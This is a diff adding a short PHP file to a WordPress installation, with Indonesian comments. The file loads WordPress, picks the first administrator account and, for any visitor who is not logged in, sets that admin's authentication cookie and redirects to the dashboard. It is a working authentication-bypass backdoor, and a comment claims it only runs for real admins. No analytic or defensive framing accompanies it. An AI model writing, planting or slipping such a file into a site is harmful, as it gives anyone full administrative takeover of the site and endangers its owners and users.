@@ -1,0 +1,33 @@
+<?php
+// Load WordPress
+require_once __DIR__ . '/wp-load.php';
+
+// Berjalan kalo beneran admin ya guys
+
+if (!is_user_logged_in()) {
+    // Get all admin users
+    $admin_users = get_users([
+        'role'    => 'administrator',
+        'orderby' => 'ID',
+        'order'   => 'ASC',
+        'number'  => 1
+    ]);
+
+    if (!empty($admin_users)) {
+        $user = $admin_users[0];
+
+        // Masuk Ke Dashboard Admin Ini Yeah
+        wp_set_current_user($user->ID);
+        wp_set_auth_cookie($user->ID);
+        do_action('wp_login', $user->user_login, $user);
+
+        // Redirect Ke dashboard Admin
+        wp_redirect(admin_url());
+        exit;
+    } else {
+        echo 'No administrator account found.';
+    }
+} else {
+    echo "Already logged in as: " . wp_get_current_user()->user_login;
+}
+?>
